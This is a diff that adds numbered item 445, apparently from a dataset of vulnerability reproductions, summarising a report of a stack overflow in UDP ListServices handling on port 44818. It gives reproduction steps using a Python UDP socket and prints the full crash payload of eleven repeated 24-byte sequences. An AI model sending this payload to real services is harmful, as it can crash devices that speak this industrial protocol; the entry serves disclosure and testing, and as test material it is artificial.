@@ -1,0 +1,10 @@
+Number: 445
+
+Summarize:
+No affected version is identified in the report. The report states that UDP ListServices request handling on port 44818 can hit a stack overflow when it receives one crafted datagram containing 11 consecutive sequences of `04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00`, where `0x04` is described as the ListServices message. The specific validation failure or root cause is not described; the demonstrated impact is a stack overflow.
+
+Reproduce:
+No build configuration or exact version is provided. To reproduce, target a service at `127.0.0.1:44818` over UDP, then: (1) create a Python `socket.AF_INET` / `socket.SOCK_DGRAM` socket; (2) construct one payload from hex consisting of 11 repetitions of `04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00`; (3) send that single datagram to `('localhost', 44818)` with `sock.sendto(data, udp_addr)`; and (4) close the socket. The report says this causes a stack overflow.
+
+Payload:
+04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
